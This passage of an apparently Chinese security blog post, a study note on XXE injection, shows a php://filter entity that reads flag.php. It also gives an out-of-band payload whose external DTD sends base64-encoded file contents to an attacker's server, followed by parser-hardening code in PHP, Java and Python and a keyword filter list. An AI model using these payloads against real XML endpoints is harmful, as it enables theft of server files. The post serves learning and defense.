class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span><br><span class="xml">]&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span></span><br><span class="xml">	<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">convert</span> [ </span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span><br><span class="perl">%remote;%int;%send;</span><br><span class="xml">]&gt;</span><br></code></pre></td></tr></table></figure>
+<p>evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64－encode/resource=file:///D:/test.txt&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">int</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:9999?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>有报错直接查看报错信息。</p>
+<p>无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p>
+<p><strong>整个调用过程：</strong></p>
+<p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>&amp;#37;</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。(大佬分析的，太强了)</p>
+<h2 id="3-XXE漏洞防御"><a href="#3-XXE漏洞防御" class="headerlink" title="3.XXE漏洞防御"></a>3.XXE漏洞防御</h2><p><strong>不管何种语言，主要是禁止外部实体的加载</strong></p>
+<p><strong>php:</strong></p>
+<p>libxml_disable_entity_loader(true);</p>
+<p>JAVA中解析XML常见的几个库有DOM、DOM4J、JDOM 和SAX</p>
+<p><strong>java:</strong><br>feature表示解析器的功能，通过设置feature，我们可以控制解析器的行为。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br>DocumentBuilderFactory dbf =<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DocumentBuilderFactory</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>dbf.set<span class="hljs-constructor">ExpandEntityReferences(<span class="hljs-params">false</span>)</span>;<br><br><span class="hljs-comment">// 这是优先选择. 如果不允许DTDs (doctypes) ,几乎可以阻止所有的XML实体攻击</span><br>set<span class="hljs-constructor">Feature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-params">true</span>)</span>;<br><span class="hljs-comment">// 如果不能完全禁用DTDs，最少采取以下措施，必须两项同时存在</span><br>set<span class="hljs-constructor">Feature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-params">false</span>)</span>;<span class="hljs-comment">// 防止外部实体POC</span><br>set<span class="hljs-constructor">Feature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-params">false</span>)</span>;<span class="hljs-comment">// 防止参数实体POC</span><br><br><br><br></code></pre></td></tr></table></figure>
+<p>最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。<br>修复代码如：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public String xxe<span class="hljs-constructor">_SAXParser_fix(HttpServletRequest <span class="hljs-params">request</span>)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            String xml_con = get<span class="hljs-constructor">Body(<span class="hljs-params">request</span>)</span>;<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(xml_con);<br><br>            SAXParserFactory spf = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SAXParserFactory</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>            spf.set<span class="hljs-constructor">Feature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-params">true</span>)</span>;<br>            spf.set<span class="hljs-constructor">Feature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-params">false</span>)</span>;<br>            spf.set<span class="hljs-constructor">Feature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-params">false</span>)</span>;<br>            SAXParser parser = spf.<span class="hljs-keyword">new</span><span class="hljs-constructor">SAXParser()</span>;<br>            parser.parse(<span class="hljs-keyword">new</span> <span class="hljs-constructor">InputSource(<span class="hljs-params">new</span> StringReader(<span class="hljs-params">xml_con</span>)</span>), <span class="hljs-keyword">new</span> <span class="hljs-constructor">DefaultHandler()</span>);  <span class="hljs-comment">// parse xml</span><br>            return <span class="hljs-string">&quot;test&quot;</span>;<br>        &#125; catch (Exception e) &#123;<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(e);<br>            return <span class="hljs-string">&quot;except&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+<p><strong>Python：</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(<span class="hljs-attribute">resolve_entities</span>=<span class="hljs-literal">False</span>))<br></code></pre></td></tr></table></figure>
+<p><strong>2.检测/过滤关键词</strong><br>常见的可以过滤<code>ENTITY</code>，openrasp采用的方式为检测敏感协议和读取的敏感文件。但都存在被绕过的风险。</p>
+<p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/PHP%E5%AE%89%E5%85%A8/">PHP安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/03/01/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sql注入漏洞学习（知识整理）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/03/01/HTML%E5%9F%BA%E7%A1%80/">
+                        <span class="hidden-mobile">HTML基础</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
